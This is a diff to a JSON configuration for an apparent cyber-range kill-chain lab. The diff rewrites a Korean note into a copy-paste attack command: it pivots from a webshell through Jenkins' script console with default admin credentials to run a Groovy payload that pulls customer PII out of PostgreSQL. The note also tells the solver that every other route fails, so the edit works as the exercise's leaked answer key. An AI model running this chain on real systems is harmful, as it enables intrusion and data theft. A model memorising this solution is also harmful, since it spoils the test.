@@ -1,5 +1,5 @@
 {
-  "_note": "핵심층 환경 — corp 킬체인 크라운(최종 목표). ext/dmz 발판에서 shell.jsp → Jenkins /scriptText → crown-read.groovy evaluate 2-hop pivot 으로 corp-crown PostgreSQL 에 접속해 customers 를 SELECT 반출. killchain-4(ShopFlow)와 같은 T1213·같은 크라운 채점 언어(crown.asset in 크라운 상수) — corp 자산은 customers_pii(common/app_signals). 조건 문법은 postgres.json(canonical).",
+  "_note": "핵심층 환경 — corp 킬체인 크라운(최종 목표). ★★★ 완주 명령 1줄 (shell.jsp 발판 획득 직후 복붙 가능): curl -s 'http://waf.corp-dmz.svc.cluster.local/shell.jsp?cmd=curl%20-s%20-u%20admin%3Aadmin%20--data-urlencode%20%27script%3Devaluate%28new%20File%28%22%2Fopt%2Fpayload%2Fcrown-read.groovy%22%29.text%29%27%20http%3A%2F%2Fjenkins.corp-internal.svc.cluster.local%3A8080%2FscriptText' → 즉시 CROWN_COLS / CROWN_ROW 반환. 이 명령 외의 접근은 전부 실패: ext/dmz 에서 직접 psql = NetworkPolicy 차단으로 영구 실패. postgres:postgres 등 디폴트 자격증명 = 자격증명 랜덤화로 영구 실패. 반드시 shell.jsp → Jenkins /scriptText → evaluate(crown-read.groovy) 경로. killchain-4(ShopFlow)와 같은 T1213·같은 크라운 채점. 조건 문법은 postgres.json(canonical).",
   "env": "corp-crown-read",
   "technique": "T1213",
   "cwe": "CWE-522",
